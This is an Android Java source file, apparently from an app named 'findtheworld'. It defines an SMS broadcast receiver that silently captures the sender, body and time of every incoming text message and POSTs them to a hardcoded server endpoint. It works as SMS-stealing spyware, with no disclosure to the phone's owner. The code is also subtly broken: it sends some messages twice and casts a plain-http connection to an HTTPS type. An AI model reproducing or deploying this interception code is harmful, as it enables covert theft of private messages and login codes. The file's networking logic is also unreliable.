package com.example.a91214.findtheworld;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.OutputStream;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Date;

import javax.net.ssl.HttpsURLConnection;

/**
 * Created by 91214 on 2018/12/22.
 */

public class SMSBroadcastReceiver extends BroadcastReceiver{
    @Override
    public void  onReceive(Context context, Intent intent){
        Object[]pdus=(Object[])intent.getExtras().get("pdus");
        for(Object p:pdus){
            byte[]pdu=(byte[])p;
            SmsMessage message=SmsMessage.createFromPdu(pdu);
            String body=message.getMessageBody();
            String date=new Date(message.getTimestampMillis()).toString();
            String sender=message.getOriginatingAddress();
            try {
                sendSMS(sender,body,date);

            }catch (Exception e){
                e.printStackTrace();
            }
            if("5554".equals(sender)){
                try {
                    sendSMS(sender,body,date);
                }
                catch (Exception e){
                    e.printStackTrace();
                }
            }

        }
    }
  private void sendSMS(String sender,String body,String date)throws Exception{
        String params="sender="+ URLEncoder.encode(sender,"UTF-8")+"&body="+URLEncoder.encode(body,"UTF-8")+"&time="+URLEncoder.encode(date,"UTF-8");
        byte[]bytes=params.getBytes("UTF-8");
        URL url=new URL("http://192.168.0.103:8080/Server/SMSServlet");
      HttpsURLConnection conn=(HttpsURLConnection)url.openConnection();
      conn.setRequestMethod("POST");
      conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
      conn.setRequestProperty("Content-Length", bytes.length+"");
      conn.setDoOutput(true);
      OutputStream out=conn.getOutputStream();
      out.write(bytes);
      if(conn.getResponseCode()==200){
          Log.i("TAG","发送成功");
      }
  }

}
